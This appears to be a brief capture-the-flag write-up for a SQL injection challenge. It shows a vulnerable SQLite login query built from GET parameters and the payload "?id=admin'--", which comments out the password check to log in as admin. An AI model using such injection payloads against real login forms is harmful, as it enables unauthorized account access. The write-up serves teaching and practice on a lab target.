---
custom_edit_url: null
sidebar_position: 37
---

<figure style={{ textAlign: 'center' }}>
![1](https://github.com/Kunull/Write-ups/assets/110326359/ee1b1690-7edb-48f2-9c67-11fe997c203d)
</figure>

We are provided with the SQLite query:

```sqlite
SELECT id FROM member WHERE id='{$_GET[id]}' AND pw='{$_GET[pw]}'
```

In SQLite the comment character is `--`.

If we provide the following URI parameter:

```
?id=admin'--
```

The resultant query becomes:

```sqlite
SELECT id FROM member WHERE id='admin'--' AND pw=''
```

<figure style={{ textAlign: 'center' }}>
![2](https://github.com/Kunull/Write-ups/assets/110326359/d8bbcea4-8ed4-43df-87be-e2c7d20fe5f0)
</figure>
